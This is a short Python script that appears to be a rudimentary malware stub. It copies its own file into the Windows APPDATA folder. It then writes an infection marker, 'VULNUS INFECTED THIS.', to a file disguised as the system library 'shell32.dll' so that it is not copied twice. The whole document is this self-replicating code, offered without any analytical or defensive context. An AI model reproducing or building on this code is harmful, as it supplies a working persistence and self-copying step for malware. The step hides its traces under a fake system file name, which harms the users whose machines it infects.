import os
import shutil
import base64

ptp = os.environ['appdata']
fkfn = "shell32.dll" # Fake filename to stop re-copy
if not os.path.isfile(f"{ptp}\\{fkfn}"):
    sfn = os.path.basename(__file__)
    if shutil.copy(__file__, ptp+os.sep+sfn):
        print(f"Copy {sfn} to {ptp}")
        try:
            f = open(f"{ptp}{os.sep}{fkfn}", "w")
            f.write("VULNUS INFECTED THIS.")
            f.close()
        except:
            print("Error (1).")
        
    else:
        print("Error (2).")
else:
    print("File already copied.")
